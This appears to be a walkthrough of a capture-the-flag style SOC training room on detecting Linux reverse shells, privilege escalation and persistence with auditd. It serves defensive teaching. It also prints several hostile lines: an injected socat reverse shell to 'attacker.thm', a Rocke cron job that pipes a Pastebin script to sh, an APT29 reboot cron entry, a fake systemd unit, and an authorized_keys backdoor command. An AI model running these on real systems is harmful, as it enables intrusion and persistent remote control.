## Task 2: Reverse Shells
### Attack Convenience
Threat actors entering via SSH get a convenient terminal with colors, autocompletion, and Ctrl+C support. However, not every breach grants a fully functional terminal. When Initial Access happens via an exploit or a web vulnerability, the attackers may face limitations: Buggy command output, execution delays and timeouts, rate limits, network restrictions, and many more. In this task, you will gain access to the TryPingMe app and see how these limitations work in practice.

### Reverse Shells
To combat the limitations, threat actors establish a reverse shell - a session from the victim to the attacker, a more convenient and often the only possible action to continue the attack. You can read about reverse shells in the Shells Overview room, but let's focus on the detection part for this task. Below are three of the many methods to open a reverse shell on Linux:
<img width="1237" height="262" alt="image" src="https://github.com/user-attachments/assets/26fbb284-05a8-4903-a78e-fda49561f72c" />

### Detecting Reverse Shells
SOC typically treats reverse shells as critical alerts as they indicate that the system has already been breached and a human threat actor is actively attempting to establish a shell and continue the attack. Luckily, they are detectable with auditd. Below is the log output when a socat reverse shell is established after exploiting a vulnerability in the TryPingMe application:
* *root@thm-vm:~$ ausearch -i -x socat # Look for suspicious commands like socat*
* *root@thm-vm:~$ ausearch -i --pid 27806 # Find its parent process and build a process tree*
* *root@thm-vm:~$ ausearch -i --pid 27796 # Move up the process tree to confirm its origin - TryPingMe*

After the reverse shell to the attacker's IP is established, it is usually followed by Discovery and other stages you learned in the previous rooms. As always, you can list all commands originating from the spawned reverse shell by building a process tree:
* *root@thm-vm:~$ ausearch -i -x socat # Start from the detected reverse shell*
* *root@thm-vm:~$ ausearch -i --ppid 27808 | grep proctitle # List all its child processes*

**Q1: Run 127.0.0.1 && whoami in the TryPingMe web app.
What output do you see after the ping results?**
<img width="806" height="285" alt="image" src="https://github.com/user-attachments/assets/979644d1-62a8-4fed-a155-69c19d175538" />

**Q2: Now try spawning a reverse shell to the imaginary "attacker.thm" address.
Run 127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh in the web app.
What is the flag returned in the TryPingMe response?**
<img width="590" height="809" alt="image" src="https://github.com/user-attachments/assets/c4ce491f-7dbb-4c28-a347-73aa7665cde5" />

**Q3: Now look at the exported auditd logs at /home/ubuntu/scenario.
Which IP spawned a similar reverse shell via the TryPingMe app?**
<img width="762" height="117" alt="image" src="https://github.com/user-attachments/assets/b13b9cea-eecb-41eb-934f-f939bd0bee96" />

## Task 3: Privilege Escalation
### Privilege Escalation Basics
Another obstacle for attackers is insufficient privileges. Initial Access doesn't always mean a full system compromise, and web attacks and exploits often start as low-privilege service users. These users can sometimes be restricted to a single folder (e.g. /var/www/html) or have no ability to download and run malware. In this case, the attackers need Privilege Escalation(opens in new tab), which can be achieved through various techniques. For example, to get to the root user, the threat actors may:
<img width="1236" height="261" alt="image" src="https://github.com/user-attachments/assets/88237891-2803-40e9-9b94-067774a3d770" />

### Detecting Privilege Escalation
Detecting Privilege Escalation might be tricky because of how different it can be: There are hundreds(opens in new tab) of SUID misconfigurations and thousands of software vulnerabilities, each exploitable in its own unique way. Thus, a more universal approach would be to detect the surrounding events. For example, review the attack below which has just three steps: Discovery, Privilege Escalation, and Exfiltration after the "root" access is gained.
<img width="759" height="400" alt="image" src="https://github.com/user-attachments/assets/1e9b47a1-78c1-4172-8227-5babb10dbfbd" />

Even if you don't know the exact mechanics of the PwnKit(opens in new tab) exploit, you can still detect anomalies using more common attack indicators. After spotting suspicious activity, you can confirm whether privilege escalation succeeded by comparing the effective user before and after the exploit. If the users differ, the attacker gained elevated privileges, like in the example below:
* *root@thm-vm:~$ ausearch -i -x pwnkit # The PwnKit was launched by serviceuser (Look at the UID field)*
* *root@thm-vm:~$ ausearch -i --ppid 24304 # The PwnKit spawned a root shell (Look at the UID field)*
* *root@thm-vm:~$ ausearch -i --ppid 24310 # The threat actor continues the attack as root user*

**Q1: Which command line was used to look for the "pass" keyword in files?**
<img width="765" height="84" alt="image" src="https://github.com/user-attachments/assets/4807ecaa-2a1f-4d42-a97e-dc7b63a2e60d" />

**Q2: Which command line was used to escalate privileges to root?**
<img width="713" height="82" alt="image" src="https://github.com/user-attachments/assets/1d9c912f-dc83-4bc5-9396-b4dcd21dcde8" />

**Q3: Looking at the detected .env file, what was the root password?**
<img width="761" height="85" alt="image" src="https://github.com/user-attachments/assets/7f33162f-49c5-4868-b87b-10397948d01a" />

## Task 4: Startup Persistence
### Persistence in Linux
Standalone Linux servers can run for years without a single reboot and are often left untouched unless something breaks. Some threat actors rely on it and do not rush to establish Persistence(opens in new tab). However, those aiming for long-term access often set up one or two additional backdoors. As in Windows, there are many ways threat actors persist on Linux. Let's start with the most common ones.

### Cron Persistence
Cron jobs are like scheduled tasks in Windows - they are the simplest way to run a process on schedule and the most popular persistence method. For example, as a part of a big espionage campaign, APT29 deployed a fully-functional malware named GoldMax (CrowdStrike blogpost). To ensure the malware survives a reboot, they added a new line to the victim's cron job file, located at /var/spool/cron/<user>.
* *@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &*
Another example is Rocke cryptominer. After exploiting vulnerabilities in public-facing services like Redis or phpMyAdmin, Rocke downloads the cryptomining script from Pastebin and installs it as a /etc/cron.d/root cron job (Red Canary blogpost). Note the */10 part, which means the script will be redownloaded every 10 minutes, likely to quickly restore its files in case the IT team accidentally deletes them.
* *echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root*

### Systemd Persistence
Systemd services host the most critical system components. Nowadays, DNS, SSH, and nearly every web service are organized as separate .service files located at /lib/systemd/system or /etc/systemd/system folders. With "root" privileges, you can make your own services, as can the threat actors. For example, the Sandworm group once created a "cloud-online" service to enable its GOGETTER malware to run on reboot 
[Unit]
Description=Initial cloud-online job    # Fake description to mimic a trusted service
[Service]
ExecStart=/usr/bin/cloud-online 

### Detecting Persistence
Both cron jobs and systemd services are defined as simple text files, which means you can monitor them for changes using auditd. In addition, Persistence can be detected by tracking the creation of related processes, specifically crontab for managing cron jobs and systemctl for managing services:
<img width="1235" height="484" alt="image" src="https://github.com/user-attachments/assets/1707f75d-2171-4d78-8e16-c58b2bcbae3c" />

### Lab
**Q1: What flag did you get after running the malware persisting as a service?**
<img width="761" height="53" alt="image" src="https://github.com/user-attachments/assets/47891510-1d6c-4afd-9201-124fcc8fee0c" />

<img width="668" height="209" alt="image" src="https://github.com/user-attachments/assets/947c6ca1-f3b8-4839-91c7-60a8d396ccc6" />

<img width="475" height="178" alt="image" src="https://github.com/user-attachments/assets/b2a32e76-97d4-48ab-8f18-31ce1cc4ce81" />


**Q2: What flag did you get after running the malware persisting as a cron job?**
<img width="699" height="440" alt="image" src="https://github.com/user-attachments/assets/a4bc6f10-5dea-43af-84b8-dc6370c7dd94" />

<img width="459" height="173" alt="image" src="https://github.com/user-attachments/assets/a56d5c1a-8036-4e53-b5f5-dd1837236534" />

## Task 5: Account Persistence
### New User Account
If SSH is exposed, the attackers may create a new user account, add it to a privileged group, and then use it for further SSH logins. The detection is simple, too, as you can track the user creation events through authentication logs and then reconstruct the full process tree with auditd (by starting with ausearch -i --ppid 27254 for the example below): 
* *root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod'*

### Backdoored SSH Keys
This technique is difficult for IT to spot as malicious keys can blend in with legitimate ones. For example:
<img width="867" height="196" alt="image" src="https://github.com/user-attachments/assets/b67d9f96-b3a6-4036-af19-fef869570077" />

By default, authorized SSH public keys are stored in each user's ~/.ssh/authorized_keys file, so your best detection method is to monitor changes to these files using auditd. Note that relying on process creation events is ineffective, since there are numerous ways to modify SSH keys, some of which aren't properly traced with auditd. For example, echo [key] >> ~/.ssh/authorized_keys will not be logged, as echo is a shell builtin:
<img width="1214" height="176" alt="image" src="https://github.com/user-attachments/assets/971d8ab8-d728-4754-bf20-9c3c1df42cbc" />

### Application Persistence
<img width="1530" height="307" alt="image" src="https://github.com/user-attachments/assets/f5d1ef1a-3531-495f-99de-3ab97613cdd3" />

### Lab
**Q1: Which user was created and added to the sudo group?**
<img width="768" height="63" alt="image" src="https://github.com/user-attachments/assets/f38cc28d-f331-45a6-ad82-9ba5d2fb5376" />


**Q2: Which file was changed to allow SSH key persistence?**
<img width="767" height="295" alt="image" src="https://github.com/user-attachments/assets/82104923-ebbc-4c79-8484-b58f6ff3f498" />

## Task 6: Targeted Attacks and Recap
### Linux as Entry Point
Linux machines are commonly deployed as firewalls, web servers, mail servers, or other public-facing services. Even in organizations where 99% of the infrastructure is Windows-based, a single compromised Linux server can open the door to a corporate network and result in a big Impact. That's why, as a SOC analyst, you need to know how to secure all popular operating systems!
<img width="1495" height="260" alt="image" src="https://github.com/user-attachments/assets/ac0cd442-8d32-4d8d-ad4f-3d1f7d2c01c0" />

### Linux in Espionage
Linux machines can store sensitive information or be used in mission-critical networks and thus are often targeted by state-sponsored threat groups. For example, in this espionage campaign (Symantec article), Kimsuky APT installed a backdoor on multiple important Linux targets. Interestingly, they used systemd service persistence - the technique you already know.
<img width="1495" height="260" alt="image" src="https://github.com/user-attachments/assets/37565bba-e993-4d05-a4dd-a07c86ce8891" />

### Linux in Ransomware
Linux ransomware is on the rise, with hypervisors becoming a prime target. Imagine the case: Your company runs hundreds of Windows VMs, all sitting on just three Linux physical servers (hypervisors). If those hypervisors aren't properly secured, all corporate VMs are at risk. For a real-world example of how attackers breach hypervisors, check out the Varonis article.
<img width="1494" height="260" alt="image" src="https://github.com/user-attachments/assets/e993d32c-0267-4804-8d0b-608dace11b6c" />











